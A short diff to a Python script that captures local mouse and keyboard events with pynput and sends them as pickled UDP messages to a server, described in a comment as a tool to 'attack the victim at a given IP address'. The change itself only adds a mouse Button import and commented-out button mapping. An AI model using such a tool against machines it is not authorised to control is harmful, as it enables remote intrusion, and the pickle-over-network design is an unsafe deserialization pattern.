@@ -3,7 +3,7 @@
 import sys
 from socket import socket, AF_INET, SOCK_DGRAM, gethostbyname_ex, gethostname
 from pynput.keyboard import Key, Listener as KeyListener
-from pynput.mouse import Listener as MouseListener
+from pynput.mouse import Listener as MouseListener, Button
 import pickle
 
 # Attack the victim at a given IP address
@@ -55,6 +55,13 @@ def on_move(x, y):
     msg_socket.sendto(pickle.dumps(msg), SERVER)
 
 def on_click(x, y, button, pressed):
+    # if button == Button.left:
+    #     _button = 'left'
+    # elif button == Button.middle:
+    #     _button = 'middle'
+    # elif button == Button.right:
+    #     _button = 'right'
+
     msg = {
         "type": "mouse",
         "action": "click",
